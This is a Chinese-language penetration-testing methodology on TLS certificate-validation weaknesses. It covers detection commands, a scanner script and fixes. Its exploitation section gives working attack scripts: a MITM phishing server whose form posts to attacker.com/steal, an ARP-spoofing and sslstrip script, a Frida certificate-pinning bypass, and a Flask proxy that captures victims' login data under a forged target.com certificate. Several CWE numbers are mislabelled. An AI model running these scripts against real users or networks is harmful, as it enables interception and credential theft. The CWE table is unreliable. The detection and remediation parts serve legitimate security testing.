# 证书验证攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的证书验证攻击检测和利用流程。证书验证漏洞是指系统在 TLS/SSL 证书验证过程中存在缺陷，可能导致中间人攻击、证书欺骗等安全风险。

## 1.2 适用范围

本文档适用于所有使用 TLS/SSL 加密通信的系统，包括：
- HTTPS Web 应用
- API 服务
- 移动应用后端
- 微服务间通信
- 邮件服务（SMTP/IMAP）
- 数据库连接

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

证书验证攻击针对 TLS/SSL 证书验证过程中的缺陷，主要包括：

| 漏洞类型 | CWE 映射 | 描述 |
|---------|---------|------|
| 证书验证不当 | CWE-295 | 未正确验证证书有效性 |
| 证书链验证不当 | CWE-296 | 未验证证书信任链 |
| 未验证证书吊销状态 | CWE-297 | 未检查 CRL/OCSP |
| 证书过期 | CWE-298 | 接受过期证书 |
| 主机名不匹配 | CWE-296 | 未验证证书主机名 |

**本质问题**：
- 客户端未正确验证服务器证书
- 接受自签名证书
- 接受过期证书
- 未检查证书吊销列表（CRL）
- 未进行在线证书状态协议（OCSP）检查
- 主机名验证缺失

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-295 | 证书验证不当 (Improper Certificate Validation) |
| CWE-296 | 主机名不匹配的证书验证不当 (Improper Following of a Certificate's Chain of Trust) |
| CWE-297 | 未验证证书吊销状态 (Failure to Verify Certificate Revocation Status) |
| CWE-298 | 证书过期 (Expired Certificate) |
| CWE-299 | 加密密钥管理不当 (Improper Access Control for Encryption Key) |
| CWE-300 | 通道外数据传输 (Channel Accessible by Non-Endpoint) |

### 证书验证漏洞风险等级

| 场景 | 风险等级 | 说明 |
|-----|---------|------|
| 完全禁用证书验证 | 严重 | 完全暴露于 MITM 攻击 |
| 接受所有证书 | 严重 | 包括自签名和伪造证书 |
| 未验证主机名 | 高 | 可被钓鱼网站利用 |
| 未检查吊销状态 | 中 - 高 | 可能接受被吊销证书 |
| 接受过期证书 | 中 | 证书可能已不安全 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 移动应用 | App API 通信 | 硬编码接受所有证书 |
| IoT 设备 | 设备云服务通信 | 证书验证代码缺失 |
| 内部系统 | 内网服务通信 | 使用自签名证书无验证 |
| 开发/测试环境 | 本地开发服务器 | 测试配置部署到生产 |
| 微服务架构 | 服务间 mTLS | 证书验证配置错误 |
| API 网关 | 后端服务通信 | 证书验证被禁用 |
| 邮件客户端 | SMTP/IMAP 连接 | 证书验证选项被禁用 |
| 数据库客户端 | 加密数据库连接 | SSL 验证被跳过 |

### 常见代码缺陷

```python
# ❌ Python requests - 禁用证书验证
requests.get('https://target.com', verify=False)

# ❌ Python urllib2 - 接受所有证书
import ssl
ssl._create_unverified_context()

# ❌ Java - 信任所有证书
TrustManager[] trustAllCerts = new TrustManager[] {
    new X509TrustManager() {
        public void checkServerTrusted(X509Certificate[] chain, String authType) {}
        // 空实现，接受所有证书
    }
};

# ❌ Node.js - 禁用 TLS 验证
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

# ❌ Go - 跳过证书验证
&tls.Config{InsecureSkipVerify: true}

# ❌ PHP - 禁用证书验证
stream_context_create([
    'ssl' => [
        'verify_peer' => false,
        'verify_peer_name' => false
    ]
])
```

## 2.3 漏洞发现方法

### 2.3.1 黑盒检测方法

**Nmap 证书扫描**：

```bash
# 基本证书信息扫描
nmap --script ssl-cert -p 443 target.com

# 证书过期检查
nmap --script ssl-cert,ssl-enum-ciphers -p 443 target.com

# 证书链分析
nmap --script ssl-cert,ssl-date -p 443 target.com

# 完整 SSL/TLS 扫描
nmap --script ssl-enum-ciphers,ssl-cert,ssl-date,ssl-heartbleed -p 443 target.com
```

**OpenSSL 证书检查**：

```bash
# 获取证书信息
openssl s_client -connect target.com:443 -showcerts

# 检查证书有效期
openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -dates

# 检查证书主题
openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -subject

# 检查证书颁发者
openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -issuer

# 检查主机名匹配
openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -ext subjectAltName
```

**证书链验证测试**：

```bash
# 验证证书链
openssl s_client -connect target.com:443 -CAfile /etc/ssl/certs/ca-certificates.crt

# 检查证书吊销状态（CRL）
openssl s_client -connect target.com:443 -crl_check

# 检查 OCSP
openssl s_client -connect target.com:443 -status
```

**自动化证书漏洞扫描脚本**：

```python
#!/usr/bin/env python3
"""
证书验证漏洞扫描脚本
检测证书验证相关的安全问题
"""

import ssl
import socket
import subprocess
from datetime import datetime
from urllib.parse import urlparse

class CertificateScanner:
    def __init__(self, target):
        self.target = target
        self.findings = []
    
    def get_certificate(self, hostname, port=443):
        """获取服务器证书"""
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        try:
            with socket.create_connection((hostname, port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    cert_bin = ssock.getpeercert(binary_form=True)
                    return cert, cert_bin
        except Exception as e:
            print(f"[-] Error getting certificate: {e}")
            return None, None
    
    def check_certificate_expiry(self, cert):
        """检查证书有效期"""
        if not cert:
            return
        
        not_before = datetime.strptime(cert['notBefore'], '%b %d %H:%M:%S %Y %Z')
        not_after = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
        now = datetime.utcnow()
        
        # 检查是否过期
        if now > not_after:
            days_expired = (now - not_after).days
            self.findings.append({
                'type': 'EXPIRED_CERTIFICATE',
                'severity': 'HIGH',
                'description': f'Certificate expired {days_expired} days ago',
                'not_after': cert['notAfter']
            })
            print(f"[HIGH] Certificate expired {days_expired} days ago")
        
        # 检查即将过期
        elif (not_after - now).days < 30:
            days_left = (not_after - now).days
            self.findings.append({
                'type': 'CERTIFICATE_EXPIRING_SOON',
                'severity': 'MEDIUM',
                'description': f'Certificate expires in {days_left} days',
                'not_after': cert['notAfter']
            })
            print(f"[MEDIUM] Certificate expires in {days_left} days")
        
        # 检查未生效
        elif now < not_before:
            self.findings.append({
                'type': 'CERTIFICATE_NOT_YET_VALID',
                'severity': 'MEDIUM',
                'description': 'Certificate is not yet valid',
                'not_before': cert['notBefore']
            })
            print(f"[MEDIUM] Certificate is not yet valid")
    
    def check_hostname_matching(self, cert, hostname):
        """检查主机名匹配"""
        if not cert:
            return
        
        # 获取主题备用名称（SAN）
        san_list = []
        for key, value in cert.get('subjectAltName', []):
            if key == 'DNS':
                san_list.append(value)
        
        # 获取通用名称（CN）
        cn = None
        for item in cert.get('subject', []):
            for key, value in item:
                if key == 'commonName':
                    cn = value
        
        # 检查主机名是否匹配
        import fnmatch
        matched = False
        
        for name in san_list + ([cn] if cn else []):
            if fnmatch.fnmatch(hostname, name):
                matched = True
                break
        
        if not matched:
            self.findings.append({
                'type': 'HOSTNAME_MISMATCH',
                'severity': 'HIGH',
                'description': f'Certificate does not match hostname {hostname}',
                'cert_names': san_list + ([cn] if cn else [])
            })
            print(f"[HIGH] Certificate does not match hostname: {hostname}")
    
    def check_weak_signature(self, cert):
        """检查弱签名算法"""
        if not cert:
            return
        
        # 获取证书二进制数据
        # 这里简化处理，实际需要使用 cryptography 库解析
        
        # 常见弱算法
        weak_algorithms = ['md5', 'sha1']
        
        # 检查签名算法
        sig_alg = cert.get('signatureAlgorithm', '')
        for weak in weak_algorithms:
            if weak in sig_alg.lower():
                self.findings.append({
                    'type': 'WEAK_SIGNATURE_ALGORITHM',
                    'severity': 'MEDIUM',
                    'description': f'Certificate uses weak signature algorithm: {sig_alg}'
                })
                print(f"[MEDIUM] Weak signature algorithm: {sig_alg}")
    
    def check_self_signed(self, cert):
        """检查自签名证书"""
        if not cert:
            return
        
        issuer = None
        subject = None
        
        for item in cert.get('issuer', []):
            for key, value in item:
                if key == 'commonName':
                    issuer = value
        
        for item in cert.get('subject', []):
            for key, value in item:
                if key == 'commonName':
                    subject = value
        
        if issuer == subject:
            self.findings.append({
                'type': 'SELF_SIGNED_CERTIFICATE',
                'severity': 'MEDIUM',
                'description': 'Certificate is self-signed',
                'common_name': subject
            })
            print(f"[MEDIUM] Certificate is self-signed: {subject}")
    
    def scan_ssl_labs(self, hostname):
        """使用 SSL Labs API 进行扫描"""
        print(f"[*] Requesting SSL Labs scan for {hostname}...")
        
        # 使用命令行工具 sslscan
        try:
            result = subprocess.run(
                ['sslscan', '--no-colour', hostname],
                capture_output=True,
                text=True,
                timeout=60
            )
            print(result.stdout)
        except Exception as e:
            print(f"[-] sslscan error: {e}")
    
    def scan_all(self):
        """执行完整扫描"""
        parsed = urlparse(self.target)
        hostname = parsed.hostname or self.target
        port = parsed.port or 443
        
        print(f"[*] Scanning certificate for {hostname}:{port}")
        print("="*60)
        
        # 获取证书
        cert, cert_bin = self.get_certificate(hostname, port)
        
        if cert:
            print("[+] Certificate retrieved successfully")
            
            # 检查有效期
            self.check_certificate_expiry(cert)
            
            # 检查主机名匹配
            self.check_hostname_matching(cert, hostname)
            
            # 检查签名算法
            self.check_weak_signature(cert)
            
            # 检查自签名
            self.check_self_signed(cert)
        else:
            print("[-] Failed to retrieve certificate")
        
        # SSL Labs 扫描
        self.scan_ssl_labs(hostname)
        
        # 生成报告
        self.generate_report()
    
    def generate_report(self):
        """生成扫描报告"""
        print("\n" + "="*60)
        print("Certificate Validation Report")
        print("="*60)
        
        if not self.findings:
            print("[PASS] No certificate validation issues found")
        else:
            print(f"[FAIL] Found {len(self.findings)} issue(s):\n")
            for finding in self.findings:
                print(f"Type: {finding['type']}")
                print(f"Severity: {finding['severity']}")
                print(f"Description: {finding['description']}")
                print("-" * 40)

if __name__ == '__main__':
    import sys
    
    if len(sys.argv) > 1:
        scanner = CertificateScanner(sys.argv[1])
        scanner.scan_all()
    else:
        print("Usage: python certificate_scanner.py <https://target.com>")
```

### 2.3.2 白盒检测方法

**代码审计要点**：

```python
# 搜索证书验证禁用代码
grep -r "verify=False" .
grep -r "verify_peer.*false" .
grep -r "InsecureSkipVerify" .
grep -r "NODE_TLS_REJECT_UNAUTHORIZED" .
grep -r "check_hostname.*False" .
grep -r "verify_mode.*CERT_NONE" .

# 搜索自签名证书接受代码
grep -r "self.signed" .
grep -r "trust_all" .
```

**配置文件检查**：

```bash
# 检查 Nginx SSL 配置
grep -r "ssl_verify" /etc/nginx/

# 检查 Apache SSL 配置
grep -r "SSLVerifyClient" /etc/apache2/

# 检查应用 SSL 配置
grep -r "SSL_VERIFY" /app/config/
```

## 2.4 漏洞利用方法

### 2.4.1 中间人攻击（MITM）

```python
#!/usr/bin/env python3
"""
证书验证漏洞利用 - 中间人攻击
"""

from http.server import HTTPServer, SimpleHTTPRequestHandler
import ssl
import subprocess
import threading

class MITMProxyHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        # 记录请求
        print(f"[+] Intercepted GET: {self.path}")
        
        # 可以修改响应
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        # 返回钓鱼页面
        phishing_html = """
        <html>
        <body>
        <h1>Login Page (Phishing)</h1>
        <form action="http://attacker.com/steal" method="POST">
            Username: <input name="username"><br>
            Password: <input name="password" type="password"><br>
            <input type="submit" value="Login">
        </form>
        </body>
        </html>
        """
        self.wfile.write(phishing_html.encode())
    
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        print(f"[+] Intercepted POST data: {post_data.decode()}")
        
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')

def start_mitm_proxy(port=8443):
    """启动中间人代理"""
    server = HTTPServer(('0.0.0.0', port), MITMProxyHandler)
    
    # 创建自签名证书
    subprocess.run([
        'openssl', 'req', '-x509', '-newkey', 'rsa:2048',
        '-keyout', 'mitm.key', '-out', 'mitm.crt',
        '-days', '365', '-nodes',
        '-subj', '/CN=target.com'
    ])
    
    # 使用自签名证书启动 HTTPS 服务器
    server.socket = ssl.wrap_socket(
        server.socket,
        keyfile='mitm.key',
        certfile='mitm.crt',
        server_side=True
    )
    
    print(f"[*] MITM proxy started on port {port}")
    print("[*] Target users with certificate validation disabled")
    print("[*] will accept this self-signed certificate")
    
    server.serve_forever()

if __name__ == '__main__':
    start_mitm_proxy()
```

### 2.4.2 ARP 欺骗 + MITM

```bash
#!/bin/bash
# ARP 欺骗中间人攻击脚本

TARGET=$1
GATEWAY=$2
INTERFACE=$3

echo "[*] Starting ARP spoofing..."

# 启用 IP 转发
echo 1 > /proc/sys/net/ipv4/ip_forward

# 欺骗目标
arpspoof -i $INTERFACE -t $TARGET $GATEWAY &
ARPSPOOF1=$!

# 欺骗网关
arpspoof -i $INTERFACE -t $GATEWAY $TARGET &
ARPSPOOF2=$!

# 启动 SSL 剥离
sslstrip -l 8080 &
SSLSTRIP=$!

# 启动 iptables 重定向
iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080

echo "[*] MITM attack started"
echo "[*] Users with certificate validation disabled will be vulnerable"

# 等待攻击完成
wait

# 清理
kill $ARPSPOOF1 $ARPSPOOF2 $SSLSTRIP
iptables -t nat -F
```

### 2.4.3 证书固定绕过

```python
#!/usr/bin/env python3
"""
证书固定绕过 - 针对移动应用
"""

import frida
import sys

def on_message(message, data):
    if message['type'] == 'send':
        print(f"[+] {message['payload']}")

# Frida 脚本 - 绕过证书固定
frida_script = """
Java.perform(function() {
    // 绕过 OkHttp 证书固定
    try {
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function() {
            console.log('[+] Bypassing OkHttp CertificatePinner.check()');
            return;
        };
    } catch(e) {}
    
    // 绕过 TrustManager
    try {
        var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
        TrustManagerImpl.checkServerTrusted.implementation = function() {
            console.log('[+] Bypassing TrustManagerImpl.checkServerTrusted()');
        };
    } catch(e) {}
    
    // 绕过 HostnameVerifier
    try {
        var HttpsURLConnection = Java.use('javax.net.ssl.HttpsURLConnection');
        HttpsURLConnection.setDefaultHostnameVerifier.implementation = function() {
            console.log('[+] Bypassing HostnameVerifier');
        };
    } catch(e) {}
});
"""

def attach_to_app(package_name):
    """附加到目标应用"""
    device = frida.get_usb_device()
    session = device.attach(package_name)
    script = session.create_script(frida_script)
    script.on('message', on_message)
    script.load()
    print(f"[*] Attached to {package_name}")
    print("[*] Certificate pinning bypassed")
    
    # 保持运行
    sys.stdin.read()

if __name__ == '__main__':
    if len(sys.argv) > 1:
        attach_to_app(sys.argv[1])
    else:
        print("Usage: python cert_pinning_bypass.py <package_name>")
```

### 2.4.4 自签名证书攻击

```python
#!/usr/bin/env python3
"""
自签名证书攻击 - 钓鱼网站
"""

from flask import Flask, request, redirect, send_file
import ssl
import threading
import requests

app = Flask(__name__)

# 目标网站
TARGET_URL = 'https://target.com'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def proxy(path):
    """代理所有请求到目标网站"""
    
    # 记录敏感数据
    if request.method == 'POST':
        print(f"[+] Captured POST data:")
        print(f"    URL: {request.url}")
        print(f"    Data: {request.form}")
        print(f"    Files: {request.files}")
    
    # 转发请求到目标网站（使用正确的证书验证）
    url = f"{TARGET_URL}/{path}"
    
    try:
        resp = requests.request(
            method=request.method,
            url=url,
            headers={key: value for key, value in request.headers if key != 'Host'},
            data=request.get_data(),
            cookies=request.cookies,
            allow_redirects=False,
            verify=True  # 我们验证目标证书
        )
        
        # 返回目标网站的响应
        excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
        headers = [(name, value) for name, value in resp.raw.headers.items()
                   if name.lower() not in excluded_headers]
        
        return resp.content, resp.status_code, headers
    
    except Exception as e:
        return f"Error: {e}", 500

def run_phishing_site(port=443):
    """运行钓鱼网站"""
    # 创建自签名证书
    import subprocess
    subprocess.run([
        'openssl', 'req', '-x509', '-newkey', 'rsa:2048',
        '-keyout', 'phishing.key', '-out', 'phishing.crt',
        '-days', '365', '-nodes',
        '-subj', '/CN=target.com'  # 伪装成目标网站
    ])
    
    # 创建 SSL 上下文
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain('phishing.crt', 'phishing.key')
    
    # 启动服务器
    httpd = app
    print("[*] Phishing site started")
    print("[*] Users with certificate validation disabled")
    print("[*] will not see any warning")
    
    # Flask 运行
    app.run(ssl_context=context, port=port)

if __name__ == '__main__':
    run_phishing_site()
```

## 2.5 漏洞利用绕过方法

### 2.5.1 绕过证书固定

```bash
# 使用 Frida 绕过证书固定
frida -U -f com.target.app -l cert_bypass.js

# 使用 Xposed 模块
# 安装 JustTrustMe 模块
# 自动绕过大多数证书固定实现

# 使用 Objection
objection -g com.target.app explore
# 然后运行：android sslpinning disable
```

### 2.5.2 绕过 HSTS

```bash
# HSTS 绕过技术

# 1. 移除 HTTPS 前缀
# 如果用户输入 target.com 而不是 https://target.com

# 2. 使用不同子域名
# HSTS 通常只应用于特定域名
# 尝试：www.target.com, api.target.com, dev.target.com

# 3. SSL 剥离攻击
# 使用 sslstrip 工具
sslstrip -l 8080

# 4. 第一请求攻击
# HSTS 只在第一次访问后生效
# 拦截第一次 HTTP 请求
```

### 2.5.3 隐蔽攻击

```python
# 使用合法证书进行攻击
# 从 Let's Encrypt 获取免费证书

import subprocess

# 获取证书
subprocess.run([
    'certbot', 'certonly', '--standalone',
    '-d', 'target-phishing.com'
])

# 使用合法证书运行钓鱼网站
# 这样即使证书验证启用的用户也不会看到警告
```

---

# 第三部分：附录

## 3.1 证书验证检查清单

| 检查项 | 测试方法 | 安全要求 |
|-------|---------|---------|
| 证书有效期 | 检查 notBefore/notAfter | 证书应在有效期内 |
| 主机名匹配 | 检查 CN 和 SAN | 证书应匹配访问的主机名 |
| 证书链完整 | 检查证书链 | 应有完整的信任链到根 CA |
| 签名算法 | 检查签名算法 | 应使用 SHA-256 或更强 |
| 密钥长度 | 检查公钥长度 | RSA 应≥2048 位 |
| CRL/OCSP | 检查吊销状态 | 应验证证书未被吊销 |
| 自签名证书 | 检查颁发者 | 生产环境不应使用自签名 |
| 证书固定 | 检查应用实现 | 敏感应用应实施证书固定 |

## 3.2 常用工具

| 工具 | 用途 | 命令示例 |
|-----|------|---------|
| openssl | 证书检查 | `openssl s_client -connect target:443` |
| nmap | SSL 扫描 | `nmap --script ssl-enum-ciphers -p 443 target` |
| sslscan | SSL/TLS 扫描 | `sslscan target.com` |
| testssl.sh | 完整 SSL 测试 | `./testssl.sh target.com` |
| SSL Labs | 在线 SSL 测试 | https://www.ssllabs.com/ssltest/ |
| frida | 证书固定绕过 | `frida -U -f app -l bypass.js` |
| Burp Suite | 中间人代理 | 配置 CA 证书 |
| mitmproxy | 中间人代理 | `mitmproxy --mode regular` |

## 3.3 修复建议

### 客户端修复

```python
# ✅ Python - 正确验证证书
import requests
response = requests.get('https://target.com', verify=True)

# ✅ Java - 正确验证证书
HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();
conn.setSSLSocketFactory(SSLSocketFactory.getDefault());
conn.setHostnameVerifier(HttpsURLConnection.getDefaultHostnameVerifier());

# ✅ Node.js - 正确验证证书
// 不要设置 NODE_TLS_REJECT_UNAUTHORIZED
const https = require('https');
https.get('https://target.com', (res) => {
    // 证书会自动验证
});

# ✅ Go - 正确验证证书
resp, err := http.Get("https://target.com")
// 默认会验证证书

# ✅ PHP - 正确验证证书
$context = stream_context_create([
    'ssl' => [
        'verify_peer' => true,
        'verify_peer_name' => true,
        'cafile' => '/path/to/ca-bundle.crt'
    ]
]);
```

### 服务器端修复

```nginx
# Nginx SSL 配置
server {
    listen 443 ssl;
    
    ssl_certificate /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;
    ssl_trusted_certificate /path/to/chain.pem;
    
    # 现代 SSL 配置
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_prefer_server_ciphers on;
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
    
    # HSTS
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
}
```

## 3.4 参考资源

- [CWE-295: Improper Certificate Validation](https://cwe.mitre.org/data/definitions/295.html)
- [OWASP Certificate and Public Key Pinning](https://cheatsheetseries.owasp.org/cheatsheets/Certificate_and_Public_Key_Pinning.html)
- [OWASP Transport Layer Protection](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html)
- [SSL Labs Testing](https://www.ssllabs.com/ssltest/)
- [testssl.sh](https://testssl.sh/)
